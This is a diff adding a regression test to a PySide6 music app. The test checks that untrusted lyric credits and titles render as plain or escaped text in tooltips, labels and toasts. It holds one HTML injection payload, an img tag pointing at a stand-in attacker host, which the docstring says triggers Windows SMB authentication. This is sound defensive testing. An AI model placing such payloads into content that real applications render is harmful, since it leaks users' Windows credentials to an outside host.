@@ -104,3 +104,29 @@ def test_deezer_track_does_not_drive_spotify_loopback_and_persists_tags(make_win
     lib_page = LibraryPage(lambda _p: None)
     assert lib_page is not None
     win.close()
+
+
+def test_untrusted_credit_and_titles_never_render_as_html(make_window, qapp):
+    """An `<img src=//host/...>` rendered as rich text makes Windows authenticate to that host over SMB."""
+    from PySide6.QtCore import Qt
+    from PySide6.QtWidgets import QLabel
+
+    from marea.ui.toast import Toast
+
+    payload = "<img src=//attacker.invalid/s/a.png>"
+    ly = parse_lrc("[00:01.00]line\n[00:04.00]\n")
+    ly.credit = payload
+    win = make_window()
+    win.show()
+    win.load_project(ClipProject(ly, payload, payload, demo_cover(64)))
+    qapp.processEvents()
+    e = win.editor
+    tip = e.source_tag.toolTip()
+    assert "<img" not in tip and "&lt;img" in tip
+    assert e.subtitle.textFormat() == Qt.PlainText
+    button = SourceTagButton()
+    button.set_tag(SOURCE_LRCLIB, payload)
+    assert "<img" not in button.toolTip()
+    toast = Toast(payload)
+    assert all(label.textFormat() == Qt.PlainText for label in toast.findChildren(QLabel))
+    win.close()
